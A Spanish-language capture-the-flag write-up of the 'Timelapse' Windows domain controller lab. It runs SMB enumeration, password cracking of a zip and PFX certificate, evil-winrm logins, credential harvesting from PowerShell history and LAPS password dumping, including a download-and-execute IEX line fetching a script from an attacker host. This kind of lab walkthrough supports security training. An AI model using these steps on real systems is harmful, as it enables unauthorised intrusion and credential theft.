# Enumeración | Reconocimiento | y posibles ataques

ping 10.10.11.152

→
PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.
64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=225 ms

TTL = 127 → Windows

nmap -p- -sS --min-rate 5000 -vv -n 10.10.11.152

→
PORT  	STATE SERVICE      	REASON
53/tcp	open  domain       	syn-ack ttl 127
88/tcp	open  kerberos-sec 	syn-ack ttl 127
135/tcp   open  msrpc        	syn-ack ttl 127
139/tcp   open  netbios-ssn  	syn-ack ttl 127
389/tcp   open  ldap         	syn-ack ttl 127
445/tcp   open  microsoft-ds 	syn-ack ttl 127
464/tcp   open  kpasswd5     	syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl      	syn-ack ttl 127
3268/tcp  open  globalcatLDAP	syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5986/tcp  open  wsmans       	syn-ack ttl 127
9389/tcp  open  adws         	syn-ack ttl 127
49667/tcp open  unknown      	syn-ack ttl 127
49673/tcp open  unknown      	syn-ack ttl 127
49674/tcp open  unknown      	syn-ack ttl 127
49696/tcp open  unknown      	syn-ack ttl 127
57257/tcp open  unknown      	syn-ack ttl 127


nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,57257  10.10.11.152 -sCV -oN services

→

Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 22:06 PDT
Nmap scan report for 10.10.11.152
Host is up (0.23s latency).

PORT  	STATE SERVICE       	VERSION
53/tcp	open  domain        	Simple DNS Plus
88/tcp	open  kerberos-sec  	Microsoft Windows Kerberos (server time: 2023-04-05 06:06:33Z)
135/tcp   open  msrpc         	Microsoft Windows RPC
139/tcp   open  netbios-ssn   	Microsoft Windows netbios-ssn
389/tcp   open  ldap          	Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    	Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap          	Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http      	Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
|_ssl-date: 2023-04-05T06:08:07+00:00; +1h00m02s from scanner time.
9389/tcp  open  mc-nmf        	.NET Message Framing
49667/tcp open  msrpc         	Microsoft Windows RPC
49673/tcp open  ncacn_http    	Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         	Microsoft Windows RPC
49696/tcp open  msrpc         	Microsoft Windows RPC
57257/tcp open  msrpc         	Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m01s, deviation: 0s, median: 1h00m01s
| smb2-time:
|   date: 2023-04-05T06:07:31
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_	Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.34 seconds






crackmapexec smb 10.10.11.152

→ 
SMB     	10.10.11.152	445	DC01         	[*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)


smbclient -L 10.10.11.152 -N

→
	Sharename   	Type  	Comment
    ---------   	----  	-------
    ADMIN$      	Disk  	Remote Admin
    C$          	Disk  	Default share
    IPC$        	IPC   	Remote IPC
    NETLOGON    	Disk  	Logon server share
    Shares      	Disk 	 
    SYSVOL      	Disk  	Logon server share


crackmapexec smb 10.10.11.152 --shares

→
SMB     	10.10.11.152	445	DC01         	[*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB     	10.10.11.152	445	DC01         	[-] Error enumerating shares: STATUS_USER_SESSION_DELETED

smbmap -H 10.10.11.152 -u 'null'

→
[+] Guest session  	 IP: 10.10.11.152:445    Name: timelapse.htb                                	 
    	Disk                                             		 Permissions    Comment
    ----                                             		 -----------    -------
    ADMIN$                                       		 NO ACCESS    Remote Admin
    C$                                           		 NO ACCESS    Default share
    IPC$                                         		 READ ONLY    Remote IPC
    NETLOGON                                     		 NO ACCESS    Logon server share
    Shares                                       		 READ ONLY    
    SYSVOL                                       		 NO ACCESS    Logon server share





# Explotación y movimiento lateral

smbclient //10.10.11.152/Shares -N

→
Try "help" to get a list of possible commands.
smb: \>



smb: \> dir

→
  .                               	D    	0  Mon Oct 25 08:39:15 2021
  ..                              	D    	0  Mon Oct 25 08:39:15 2021
  Dev                             	D    	0  Mon Oct 25 12:40:06 2021
  HelpDesk                        	D    	0  Mon Oct 25 08:48:42 2021

cd Dev

→


cd HelpDesk

→
smb: \HelpDesk\>

dir

→
  .                               	D    	0  Mon Oct 25 08:48:42 2021
  ..                              	D    	0  Mon Oct 25 08:48:42 2021
  LAPS.x64.msi                    	A  1118208  Mon Oct 25 07:57:50 2021
  LAPS_Datasheet.docx             	A   104422  Mon Oct 25 07:57:46 2021
  LAPS_OperationsGuide.docx       	A   641378  Mon Oct 25 07:57:40 2021
  LAPS_TechnicalSpecification.docx  	A	72683  Mon Oct 25 07:57:44 2021


smb: \Dev\> get winrm_backup.zip

→
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)


Listo el contenido del zip
7z l winrm_backup.zip

→
   Date  	Time	Attr     	Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-25 07:21:20 .....     	2555     	2405  legacyy_dev_auth.pfx
------------------- ----- ------------ ------------  ------------------------
2021-10-25 07:21:20           	2555     	2405  1 files




fcrackzip -v -u -D -p /home/kali/Downloads/SecLists/Passwords/Leaked-Databases/rockyou.txt winrm_backup.zip

→
found file 'legacyy_dev_auth.pfx', (size cp/uc   2405/  2555, flags 9, chk 72aa)
checking pw udehss                             	 

PASSWORD FOUND!!!!: pw == supremelegacy


Descomprimo
unzip winrm_backup.zip


https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/

Todavía no puedo obtener clave privada porque me pide contraseña
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes


apt install libssl-dev

git clone https://github.com/crackpkcs12/crackpkcs12
cd crackpkcs12
./configure
make
make install


crackpkcs12 -d rockyou.txt legacyy_dev_auth.pfx

→


Password:thuglegacy


Crear la priv-key.pem / llave privada
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
Password:thuglegacy


Crear el certificado publico
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
Password:thuglegacy


Como esta abierto el puerto 5986 puedo autenticarme con la llave privada y certificado usando evil-winrm

evil-winrm -i 10.10.11.152 -c certificate.pem -k priv-key.pem -S

FLAG de usuario

net user

whoami /priv

net user legacyy


net user “variosusuarios”

net user svc_deploy

→svc_deploy pertenece al grupo *LAPS_Readers osea que seguro puede leer contraseñas







# Explotación WEB






# Escalada de privilegios

https://www.hackingarticles.in/credential-dumpinglaps/

→Uso de Get-LAPSPasswords

→https://github.com/kfosaaen/Get-LAPSPasswords


Ver historial de Powershell

AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history. txt

*Evil-WinRM* PS C:\Users\legacyy> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit



Encuentro credenciales


svc_deploy
E3R$Q62^12p7PLlC%KWaxuaV


Acceso con evilwinrm con SSL 

evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S


Equipo atacante
git clone https://github.com/kfosaaen/Get-LAPSPasswords

python3 -m http.server 80

Equipo victima
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> IEX(New-Object Net.WebCLient).downloadString('http://10.10.14.12/Get-LAPSPasswords.ps1')


Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords


Valido que es la contraseña del usuario administrador

crackmapexec smb 10.10.11.152 -u 'Administrator' -p '.1zOg84gyR2B-I9%I8QQI6!0'

htb) (signing:True) (SMBv1:False)
SMB     	10.10.11.152	445	DC01         	[+] timelapse.htb\Administrator:.1zOg84gyR2B-I9%I8QQI6!0 (Pwn3d!)


Accedo como administrador

evil-winrm -i 10.10.11.152 -u 'Administrator' -p '.1zOg84gyR2B-I9%I8QQI6!0' -S


*Evil-WinRM* PS C:\Users\TRX\desktop> type root.txt
2da82aa548b0b149ec38a187130cf82c





# Links útiles


  
  
  
## Lenguajes utilizados
## Vulnerabilidades en aplicaciones
## Ataques
## Escalada de privilegios
## Exploits
## Herramientas
